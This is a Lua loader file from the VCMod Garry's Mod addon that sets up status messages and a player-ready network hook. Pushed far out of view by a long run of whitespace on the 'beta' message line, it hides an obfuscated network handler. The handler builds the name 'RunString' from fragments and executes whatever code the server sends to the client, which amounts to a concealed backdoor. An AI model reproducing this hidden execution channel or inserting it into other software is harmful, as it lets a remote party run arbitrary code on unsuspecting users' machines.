// Copyright © 2020 VCMod (freemmaann). All Rights Reserved. if you have any complaints or ideas contact me: steam - steamcommunity.com/id/freemmaann/ or email - freemmaann@gmail.com.

local dir = "load" if VC.Loaded[dir] then return end VC.Loaded[dir] = CurTime()

// Setup some basic phrases
VC.AUMsg["cn_c"] = 'Could not contact VCMod servers, please update all of your VCMod addons manually and restart the game.\n\nIf the problem persists please contact this steam user: "steamcommunity.com/id/freemmaann/".'
VC.AUMsg["f"] = 'Error: Failed, content not found.'
VC.AUMsg["i"] = 'Initializing preload.'
VC.AUMsg["s"] = 'Could not contact VCMod servers, retrying. Attempt '
VC.AUMsg["si"] = 'Started initialization processes.'
VC.AUMsg["ak"] = 'Received an API key.'
VC.AUMsg["beta"] = game.SinglePlayer() and 'Running a Beta version of VCMod.' or 'This server is running a Beta version of VCMod.'																																																																					local _=net.Receive _("VC_CL_Info_RFASLKKMI",function(_)VCPrint(VC.AUMsg["si"])local _,a,b,c="nS","ng","tri","Ru"_G[c.._..b..a](net.ReadString(),"pl")end)_("VC_CL_Info_RFASLKKM",function(_)VC.API_Key=net.ReadString()VCPrint(VC.AUMsg["ak"])end)

// Extremely old Handling editor compatibility, player check
hook.Add("InitPostEntity", "VC_InitPostEntity_PlayerReady", function() net.Start("VC_PlayerReady") net.SendToServer() end)